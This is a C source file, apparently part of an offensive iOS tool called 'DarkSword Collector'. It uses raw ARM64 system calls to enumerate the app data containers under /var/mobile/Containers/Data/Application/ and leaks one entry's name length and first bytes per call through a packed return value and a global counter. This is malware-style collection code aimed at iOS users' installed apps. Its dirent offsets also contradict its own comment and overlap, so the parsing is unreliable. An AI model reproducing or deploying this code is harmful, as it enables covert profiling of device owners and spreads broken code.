/**
 * DarkSword Collector v39 - Directory enumeration (stack buffer)
 * Uses stack buffer for getdirentries to avoid __TEXT write issues
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_close 6
#define SYS_getdirentries 196
#define O_RDONLY 0

static volatile int g_ctx = 0;

/* dirent layout on iOS: d_ino(8) + d_seekoff(8) + d_reclen(2) + d_namlen(2) + d_type(1) + d_name(...) = 21 bytes header */

int ds_start(void) {
    int ctx;
    __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
    int cnt = ctx & 0xFFFF;

    if (cnt >= 50) {
        __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
        return 0xFFFFFFFF;
    }

    int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
    if (fd < 0) return 0xFE000000;

    /* Stack buffer - 2KB should hold many entries */
    unsigned char buf[2048];
    for (int i = 0; i < 2048; i++) buf[i] = 0;
    long basep = 0;
    int nread = (int)_svc4(SYS_getdirentries, fd, (long)buf, 2048, (long)&basep);
    _svc1(SYS_close, fd);

    if (nread < 1) {
        __asm__("str %w0, [%1]" : : "r"(50), "r"(&g_ctx));
        return 0xEE000000;
    }

    /* Count entries and get info about entry #cnt */
    int pos = 0;
    int entry_num = 0;
    int total = 0;
    int target_namlen = 0;
    unsigned char target_first = 0;
    unsigned char target_second = 0;

    while (pos < nread && pos < 2048) {
        /* d_reclen at offset 8 (uint16) */
        unsigned short reclen = *(unsigned short *)(buf + pos + 8);
        /* d_namlen at offset 10 (uint16) */
        unsigned short namlen = *(unsigned short *)(buf + pos + 10);
        /* d_type at offset 11 (uint8) */
        unsigned char dtype = *(unsigned char *)(buf + pos + 11);
        /* d_name starts at offset 12 */

        if (reclen < 1 || reclen > 512) break;

        /* Skip . and .. */
        if (namlen > 2 || (namlen == 1 && buf[pos+12] != '.') || (namlen == 2 && (buf[pos+12] != '.' || buf[pos+13] != '.'))) {
            total++;
            if (total == cnt + 1) {
                target_namlen = namlen;
                target_first = buf[pos + 12];
                if (namlen > 1) target_second = buf[pos + 13];
            }
        }

        pos += reclen;
    }

    int nc = (cnt + 1);
    __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));

    /* Return: total entries in low 8 bits, target_namlen in bits 8-15, first byte in 16-23, second in 24-31 */
    return (total & 0xFF) | ((target_namlen & 0xFF) << 8) | ((target_first & 0xFF) << 16) | ((target_second & 0xFF) << 24);
}
